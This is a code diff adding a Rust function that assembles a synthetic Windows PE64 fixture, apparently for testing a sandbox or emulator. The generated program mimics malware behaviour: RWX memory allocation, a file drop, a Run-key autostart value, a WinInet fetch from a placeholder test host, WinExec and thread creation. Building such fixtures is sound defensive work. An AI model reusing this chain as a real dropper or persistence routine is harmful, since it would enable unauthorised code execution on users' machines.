@@ -192,6 +192,298 @@ pub fn safe_dynamic_pe64() -> Vec<u8> {
     bytes
 }
 
+/// Harmless PE64 fixture that exercises the bounded x64 parity surfaces:
+/// artifacts, virtual Windows state, scripted network, provenance, threads,
+/// and vectored exception handling. It contains no native host interaction.
+pub fn parity_dynamic_pe64() -> Vec<u8> {
+    const IMAGE_BASE: u64 = 0x0000_0001_4000_0000;
+    const CODE_RVA: u32 = 0x1000;
+    const HANDLER_RVA: u32 = 0x15c0;
+    const THREAD_RVA: u32 = 0x15d0;
+    const PATH_RVA: u32 = 0x1480;
+    const PAYLOAD_RVA: u32 = 0x14c0;
+    const SUBKEY_RVA: u32 = 0x1500;
+    const VALUE_RVA: u32 = 0x1540;
+    const URL_RVA: u32 = 0x1560;
+    const SCRATCH_RVA: u32 = 0x1700;
+    const LOOKUP_RVA: u32 = 0x2040;
+    const IAT_RVA: u32 = 0x20e0;
+
+    fn mov_imm64(code: &mut Vec<u8>, register: u8, value: u64) {
+        match register {
+            1 => code.extend_from_slice(&[0x48, 0xb9]), // rcx
+            2 => code.extend_from_slice(&[0x48, 0xba]), // rdx
+            8 => code.extend_from_slice(&[0x49, 0xb8]), // r8
+            9 => code.extend_from_slice(&[0x49, 0xb9]), // r9
+            _ => unreachable!(),
+        }
+        code.extend_from_slice(&value.to_le_bytes());
+    }
+
+    fn stack_imm32(code: &mut Vec<u8>, offset: u8, value: u32) {
+        code.extend_from_slice(&[0x48, 0xc7, 0x44, 0x24, offset]);
+        code.extend_from_slice(&value.to_le_bytes());
+    }
+
+    fn call_iat(code: &mut Vec<u8>, iat_rva: u32, index: usize) {
+        let instruction_rva = CODE_RVA + code.len() as u32;
+        let next_rva = instruction_rva + 6;
+        let target = iat_rva + (index * 8) as u32;
+        let displacement = target as i64 - next_rva as i64;
+        code.extend_from_slice(&[0xff, 0x15]);
+        code.extend_from_slice(&(displacement as i32).to_le_bytes());
+    }
+
+    fn load_rcx_rip(code: &mut Vec<u8>, target_rva: u32) {
+        let instruction_rva = CODE_RVA + code.len() as u32;
+        let next_rva = instruction_rva + 7;
+        let displacement = target_rva as i64 - next_rva as i64;
+        code.extend_from_slice(&[0x48, 0x8b, 0x0d]);
+        code.extend_from_slice(&(displacement as i32).to_le_bytes());
+    }
+
+    let imports: [&[u8]; 16] = [
+        b"AddVectoredExceptionHandler",
+        b"RaiseException",
+        b"VirtualAlloc",
+        b"VirtualProtect",
+        b"CreateFileA",
+        b"WriteFile",
+        b"ReadFile",
+        b"RegOpenKeyExA",
+        b"RegSetValueExA",
+        b"RegQueryValueExA",
+        b"InternetOpenA",
+        b"InternetOpenUrlA",
+        b"InternetReadFile",
+        b"WinExec",
+        b"CreateThread",
+        b"ExitProcess",
+    ];
+
+    let mut bytes = vec![0u8; 0xc00];
+    bytes[0..2].copy_from_slice(b"MZ");
+    put_u32(&mut bytes, 0x3c, 0x80);
+    bytes[0x80..0x84].copy_from_slice(b"PE\0\0");
+    put_u16(&mut bytes, 0x84, 0x8664);
+    put_u16(&mut bytes, 0x86, 2);
+    put_u32(&mut bytes, 0x88, 0x66aa_6411);
+    put_u16(&mut bytes, 0x94, 0x00f0);
+    put_u16(&mut bytes, 0x96, 0x0022);
+
+    let optional = 0x98;
+    put_u16(&mut bytes, optional, 0x020b);
+    bytes[optional + 2] = 14;
+    put_u32(&mut bytes, optional + 4, 0x600);
+    put_u32(&mut bytes, optional + 8, 0x400);
+    put_u32(&mut bytes, optional + 16, CODE_RVA);
+    put_u32(&mut bytes, optional + 20, CODE_RVA);
+    put_u64(&mut bytes, optional + 24, IMAGE_BASE);
+    put_u32(&mut bytes, optional + 32, 0x1000);
+    put_u32(&mut bytes, optional + 36, 0x200);
+    put_u16(&mut bytes, optional + 40, 6);
+    put_u16(&mut bytes, optional + 48, 6);
+    put_u32(&mut bytes, optional + 56, 0x3000);
+    put_u32(&mut bytes, optional + 60, 0x200);
+    put_u16(&mut bytes, optional + 68, 3);
+    put_u16(&mut bytes, optional + 70, 0x0160);
+    put_u64(&mut bytes, optional + 72, 0x10_0000);
+    put_u64(&mut bytes, optional + 80, 0x1000);
+    put_u64(&mut bytes, optional + 88, 0x10_0000);
+    put_u64(&mut bytes, optional + 96, 0x1000);
+    put_u32(&mut bytes, optional + 108, 16);
+    put_u32(&mut bytes, optional + 120, 0x2000);
+    put_u32(&mut bytes, optional + 124, 0x28);
+    put_u32(&mut bytes, optional + 136, 0x15e0);
+    put_u32(&mut bytes, optional + 140, 12);
+    put_u32(&mut bytes, optional + 208, IAT_RVA);
+    put_u32(&mut bytes, optional + 212, ((imports.len() + 1) * 8) as u32);
+
+    let section = optional + 0xf0;
+    write_section(
+        &mut bytes,
+        section,
+        b".text",
+        (0x800, 0x1000, 0x600, 0x200, 0xe000_0020),
+    );
+    write_section(
+        &mut bytes,
+        section + 40,
+        b".idata",
+        (0x400, 0x2000, 0x400, 0x800, 0xc000_0040),
+    );
+
+    let mut code = Vec::new();
+    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x78]);
+
+    mov_imm64(&mut code, 1, 1);
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(HANDLER_RVA));
+    call_iat(&mut code, IAT_RVA, 0);
+    mov_imm64(&mut code, 1, 0xe042_4242);
+    mov_imm64(&mut code, 2, 0);
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 0);
+    call_iat(&mut code, IAT_RVA, 1);
+
+    mov_imm64(&mut code, 1, 0);
+    mov_imm64(&mut code, 2, 0x1000);
+    mov_imm64(&mut code, 8, 0x3000);
+    mov_imm64(&mut code, 9, 0x04);
+    call_iat(&mut code, IAT_RVA, 2);
+    code.extend_from_slice(&[0x49, 0x89, 0xc4]); // mov r12,rax
+    code.extend_from_slice(&[0x41, 0xc7, 0x04, 0x24, 0x4d, 0x5a, 0x20, 0x41]);
+    code.extend_from_slice(&[0x4c, 0x89, 0xe1]); // mov rcx,r12
+    mov_imm64(&mut code, 2, 0x1000);
+    mov_imm64(&mut code, 8, 0x40);
+    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA));
+    call_iat(&mut code, IAT_RVA, 3);
+
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(PATH_RVA));
+    mov_imm64(&mut code, 2, 0x4000_0000);
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 0);
+    stack_imm32(&mut code, 0x20, 2);
+    stack_imm32(&mut code, 0x28, 0);
+    stack_imm32(&mut code, 0x30, 0);
+    call_iat(&mut code, IAT_RVA, 4);
+    code.extend_from_slice(&[0x48, 0x89, 0xc3]); // mov rbx,rax
+    code.extend_from_slice(&[0x48, 0x89, 0xd9]); // mov rcx,rbx
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(PAYLOAD_RVA));
+    mov_imm64(&mut code, 8, 48);
+    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA));
+    stack_imm32(&mut code, 0x20, 0);
+    call_iat(&mut code, IAT_RVA, 5);
+
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(PATH_RVA));
+    mov_imm64(&mut code, 2, 0x8000_0000);
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 0);
+    stack_imm32(&mut code, 0x20, 3);
+    stack_imm32(&mut code, 0x28, 0);
+    stack_imm32(&mut code, 0x30, 0);
+    call_iat(&mut code, IAT_RVA, 4);
+    code.extend_from_slice(&[0x48, 0x89, 0xc3]); // mov rbx,rax
+    code.extend_from_slice(&[0x48, 0x89, 0xd9]); // mov rcx,rbx
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x200));
+    mov_imm64(&mut code, 8, 48);
+    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA));
+    stack_imm32(&mut code, 0x20, 0);
+    call_iat(&mut code, IAT_RVA, 6);
+
+    mov_imm64(&mut code, 1, 0x8000_0001);
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SUBKEY_RVA));
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 0x20006);
+    stack_imm32(&mut code, 0x20, SCRATCH_RVA + 8);
+    // Replace the low RVA with the full fixed image pointer.
+    let output_patch = code.len() - 4;
+    code[output_patch..output_patch + 4]
+        .copy_from_slice(&((IMAGE_BASE + u64::from(SCRATCH_RVA + 8)) as u32).to_le_bytes());
+    // The emitter is imm32, so write a full pointer in rax then spill it to the stack slot.
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 8));
+    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
+    mov_imm64(&mut code, 1, 0x8000_0001);
+    call_iat(&mut code, IAT_RVA, 7);
+    load_rcx_rip(&mut code, SCRATCH_RVA + 8);
+    code.extend_from_slice(&[0x49, 0x89, 0xcf]); // mov r15,rcx
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(VALUE_RVA));
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 1);
+    stack_imm32(&mut code, 0x20, PAYLOAD_RVA);
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(PAYLOAD_RVA));
+    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
+    load_rcx_rip(&mut code, SCRATCH_RVA + 8);
+    stack_imm32(&mut code, 0x28, 48);
+    call_iat(&mut code, IAT_RVA, 8);
+
+    code.extend_from_slice(&[0x4c, 0x89, 0xf9]); // mov rcx,r15
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(VALUE_RVA));
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 0);
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x280));
+    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x20]);
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x2f0));
+    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x28]);
+    code.extend_from_slice(&[0x4c, 0x89, 0xf9]); // mov rcx,r15
+    call_iat(&mut code, IAT_RVA, 9);
+
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(VALUE_RVA));
+    mov_imm64(&mut code, 2, 0);
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 0);
+    stack_imm32(&mut code, 0x20, 0);
+    call_iat(&mut code, IAT_RVA, 10);
+    code.extend_from_slice(&[0x49, 0x89, 0xc5]); // mov r13,rax
+    code.extend_from_slice(&[0x4c, 0x89, 0xe9]); // mov rcx,r13
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(URL_RVA));
+    mov_imm64(&mut code, 8, 0);
+    mov_imm64(&mut code, 9, 0);
+    stack_imm32(&mut code, 0x20, 0);
+    stack_imm32(&mut code, 0x28, 0);
+    call_iat(&mut code, IAT_RVA, 11);
+    code.extend_from_slice(&[0x49, 0x89, 0xc6]); // mov r14,rax
+    code.extend_from_slice(&[0x4c, 0x89, 0xf1]); // mov rcx,r14
+    mov_imm64(&mut code, 2, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x100));
+    mov_imm64(&mut code, 8, 64);
+    mov_imm64(&mut code, 9, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x180));
+    call_iat(&mut code, IAT_RVA, 12);
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x100));
+    mov_imm64(&mut code, 2, 1);
+    call_iat(&mut code, IAT_RVA, 13);
+
+    mov_imm64(&mut code, 1, 0);
+    mov_imm64(&mut code, 2, 0);
+    mov_imm64(&mut code, 8, IMAGE_BASE + u64::from(THREAD_RVA));
+    mov_imm64(&mut code, 9, 0x1337);
+    stack_imm32(&mut code, 0x20, 0);
+    mov_imm64(&mut code, 1, IMAGE_BASE + u64::from(SCRATCH_RVA + 0x1c0));
+    code.extend_from_slice(&[0x48, 0x89, 0x4c, 0x24, 0x28]);
+    mov_imm64(&mut code, 1, 0);
+    call_iat(&mut code, IAT_RVA, 14);
+    code.extend(std::iter::repeat_n(0x90, 120));
+    mov_imm64(&mut code, 1, 0);
+    call_iat(&mut code, IAT_RVA, 15);
+    code.extend_from_slice(&[0xf4]);
+    assert!(code.len() < (HANDLER_RVA - CODE_RVA) as usize);
+    bytes[0x200..0x200 + code.len()].copy_from_slice(&code);
+
+    bytes[0x7c0..0x7c6].copy_from_slice(&[0xb8, 0xff, 0xff, 0xff, 0xff, 0xc3]);
+    bytes[0x7d0..0x7d8].copy_from_slice(&[0x48, 0x89, 0xc8, 0x48, 0x83, 0xc0, 0x01, 0xc3]);
+    put_u32(&mut bytes, 0x7e0, CODE_RVA);
+    put_u32(&mut bytes, 0x7e4, HANDLER_RVA);
+    put_u32(&mut bytes, 0x7e8, 0x15f0);
+    bytes[0x7f0..0x7f8].copy_from_slice(&[0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0, 0]);
+    write_c_string(&mut bytes, 0x680, b"C:\\Temp\\aegis-x64-parity.bin");
+    let payload = b"MZ AEGIS_X64_PARITY powershell https://artifact.example.test";
+    bytes[0x6c0..0x6c0 + payload.len()].copy_from_slice(payload);
+    write_c_string(
+        &mut bytes,
+        0x700,
+        b"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    );
+    write_c_string(&mut bytes, 0x740, b"AegisSafeParity");
+    write_c_string(&mut bytes, 0x760, b"http://artifact.example.test/start");
+
+    put_u32(&mut bytes, 0x800, LOOKUP_RVA);
+    let mut name_raw = 0x980usize;
+    let mut name_rvas = Vec::new();
+    for name in imports {
+        let rva = 0x2000 + (name_raw - 0x800) as u32;
+        name_rvas.push(rva);
+        write_hint_name(&mut bytes, name_raw, name);
+        name_raw = (name_raw + name.len() + 3) & !1;
+    }
+    let dll_rva = 0x2000 + (name_raw - 0x800) as u32;
+    write_c_string(&mut bytes, name_raw, b"KERNEL32.dll");
+    put_u32(&mut bytes, 0x80c, dll_rva);
+    put_u32(&mut bytes, 0x810, IAT_RVA);
+    for (index, name_rva) in name_rvas.into_iter().enumerate() {
+        put_u64(&mut bytes, 0x840 + index * 8, u64::from(name_rva));
+        put_u64(&mut bytes, 0x8e0 + index * 8, u64::from(name_rva));
+    }
+    bytes
+}
+
 pub fn dynamic_resolution_pe32() -> Vec<u8> {
     let mut bytes = safe_dynamic_pe32();
     let code = [
